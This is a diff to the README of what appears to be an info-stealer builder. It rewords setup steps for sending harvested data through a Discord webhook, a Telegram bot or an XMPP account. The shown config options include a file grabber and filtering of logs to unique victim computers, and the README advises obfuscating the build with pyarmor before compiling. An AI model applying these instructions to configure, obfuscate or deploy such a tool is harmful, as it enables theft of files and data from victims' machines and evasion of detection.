@@ -169,7 +169,7 @@ Insert this data in builder console. Better use building using pyarmor. And wait
 ### 🔨Building(manually)
 
 ### 🎮For Discord
-Finally, insert the name and webhook link in the `config\config.py` here
+Insert your name and webhook link in the `config\config.py` here
 ```
 enableFileGrabber = False #enable file grabber
 oneStart = False #enable this if you want logs to come only from unique computers
@@ -183,7 +183,7 @@ discordData = ["url of your WebHook","name of that WebHook"]
 and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
 
 ### 📨For Telegram
-Finally, insert the name and webhook link in the `config\config.py` here
+Insert your link and chat ID in the `config\config.py` here
 ```
 enableFileGrabber = False #enable file grabber
 oneStart = False #enable this if you want logs to come only from unique computers
@@ -197,7 +197,7 @@ TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
 and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
 
 ### 📡For XMPP
-Finally, insert the name and webhook link in the `config\config.py` here
+Insert your jabber id, password and recipient  link in the `config\config.py` here
 ```
 enableFileGrabber = False #enable file grabber
 oneStart = False #enable this if you want logs to come only from unique computers
